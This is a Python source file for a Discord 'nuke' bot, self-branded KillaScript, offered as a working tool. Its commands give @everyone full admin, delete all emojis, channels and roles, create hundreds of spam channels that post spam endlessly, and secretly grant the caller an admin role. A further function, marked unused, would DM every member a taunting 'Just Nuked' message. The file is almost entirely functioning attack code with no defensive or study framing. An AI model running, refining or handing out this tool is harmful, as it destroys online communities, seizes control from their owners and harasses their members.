# packages
import discord
from discord.ext import commands
import asyncio
import time

print(f"Welcome to the KillaScript nuke tool")
print(f"Made by HudsonH. ⁽ᵉᵈⁱᵗᵉᵈ⁾#7274")
time.sleep(1)

class inputs:
    # User input options

    bottkn = input("What is your bot token?: ")
    asyncio.sleep(0.8)
    spamchan = input("What would you like to name the spam channels?: ")
    asyncio.sleep(0.8)
    spammsg = input("What would you like the spam messages to contain?: ")
    asyncio.sleep(0.8)

prefix = "*"
Bot = commands.Bot(command_prefix=prefix,
                   help_command=None)
intents = discord.Intents(messages=True,
                          guilds=True, members=True)

# start up msg
@Bot.event
async def on_ready():
    await Bot.change_presence(
        activity=discord.Activity(type=discord.ActivityType.listening, name='*help'))
    print(f"------------------------------------------------------------------------------------------------------")
    print(f"██╗  ██╗██╗██╗     ██╗      █████╗ ███████╗ ██████╗██████╗ ██╗██████╗ ████████╗")
    print(f"██║ ██╔╝██║██║     ██║     ██╔══██╗██╔════╝██╔════╝██╔══██╗██║██╔══██╗╚══██╔══╝")
    print(f"█████╔╝ ██║██║     ██║     ███████║███████╗██║     ██████╔╝██║██████╔╝   ██║   ")
    print(f"██╔═██╗ ██║██║     ██║     ██╔══██║╚════██║██║     ██╔══██╗██║██╔═══╝    ██║   ")
    print(f"██║  ██╗██║███████╗███████╗██║  ██║███████║╚██████╗██║  ██║██║██║        ██║   ")
    print(f"╚═╝  ╚═╝╚═╝╚══════╝╚══════╝╚═╝  ╚═╝╚══════╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝        ╚═╝   ")
    print(f"------------------------------------------------------------------------------------------------------")
    print(f"The bot {Bot.user} is now online")
    print(f"prefix - {prefix}")
    print(f"------------------------------------------------------------------------------------------------------")
    print(f"𝐂𝐨𝐦𝐦𝐚𝐧𝐝𝐬")
    print("*fun - The main nuke command, deletes channels and roles, "
          "creates spam channels, spam roles and spam text.")
    print("*AD - gives the person who runs this command admin.")



async def delchan(ctx):
    g = ctx.guild
    for chan in g.channels:
        try:
            await chan.delete()
            print(f"CHANNEL {chan} DELETED")
        except Exception as e:
            print(f"DELETE CHANNEL ERROR: {e}")
        else:
            pass

async def delrole(ctx):
    g = ctx.guild
    for role in g.roles:
        try:
            await role.delete()
            print(f"ROLE {role} DELETED")
        except Exception as e:
            print(f"DELETE ROLE ERROR: {e}")
        else:
            pass

async def spamchan(ctx):
    g = ctx.guild
    try:
        amount = 500
        for i in range(amount):
            await g.create_text_channel(inputs.spamchan)
            print(f"CREATED CHANNEL")
            await g.create_text_channel(inputs.spamchan)
            print(f"CREATED CHANNEL")
    except Exception as e:
        print(f"CREATE CHANNEL ERROR: {e}")

async def delemoji(ctx):
    g = ctx.guild
    for eji in list(g.emojis):
        try:
            await eji.delete()
            print(f"EMOJI {eji} DELETED")
        except Exception as e:
            print(f"DELETE EMOJI ERROR: {e}")

#----------------------------- COMMANDS BELOW NOT INCLUDED, WONT WORK WITH EXE/NOT RELYABLE -------------------------------------------

async def MASSMSG(ctx):
    await ctx.message.delete()
    g = ctx.guild
    for user in list(Bot.get_all_members()):
        await asyncio.sleep(0)
        try:
            emb = discord.Embed(title=f"Just Nuked {g.name}", description=f"Call me fifa because i just packed '{g.name}' server!", color=discord.Colour.red())
            emb.add_field(name="Trolled yet?", value="")
            emb.set_thumbnail(url=
            "https://th.bing.com/th/id/R.08f2b500d9bb9e17b49fc65581080595?rik=%2fFyBMJRjSJp6%2bw&riu=http%3a%2f%2fclipart-library.com%2fimages%2fkiMKgBreT.jpg&ehk=L6zy4qgSecBdRYGUArfbyS4FcCgdH4Rq9akd39hTpbI%3d&risl=&pid=ImgRaw&r=0")
            await asyncio.sleep(1)
            await user.send(embed=emb)
        except Exception as e:
            print(f"CANT SEND MESSAGE ERROR {user}: {e}")
        print(f"SENT MESSAGE TO {user}")

#------------------------------------------------------------------------------------------------------------------------------

@Bot.command(pass_context=True) # GIVES @EVERYONE ADMIN
async def fun(ctx):
    await ctx.message.delete()
    g = ctx.guild
    rle = discord.utils.get(g.roles, name="@everyone")
    try:
        await rle.edit(permissions=discord.Permissions.all())
        print(f"GRANTED '@everyone' ADMIN PERMS")
    except Exception as e:
        print(f"COULD NOT GRANT '@everyone' ADMIN PERMS: {e}")

    await delemoji(ctx)# DELETES ALL EMOJIS

    await delchan(ctx)# DELETES ALL CHANNELS

    await delrole(ctx)# DELETES ALL ROLES

    await spamchan(ctx)# CREATES SPAM CHANNELS

@Bot.command()# CREATES PRIVATE ROLE WITH ADMIN PERMS FOR PERSON WHO RUNS *AD
async def AD(ctx):
    await ctx.message.delete()
    g = ctx.guild
    auth = ctx.message.author
    try:
        role = await g.create_role(name=".", permissions=discord.Permissions(8))
        await auth.add_roles(role)
        print(f"GIVEN ADMIN TO {auth}")
    except Exception as e:
        print(f"COULD NOT GIVE USER {auth} ADMIN: {e}")


@Bot.event # SENDS SPAM MESSAGES TO SPAM CHANNELS
async def on_guild_channel_create(channel):
    while True:
        await channel.send(inputs.spammsg)
        print(f"SPAM MESSAGE SENT")
        await channel.send(inputs.spammsg)
        print(f"SPAM MESSAGE SENT")
        await channel.send(inputs.spammsg)
        print(f"SPAM MESSAGE SENT")

Bot.run(inputs.bottkn)
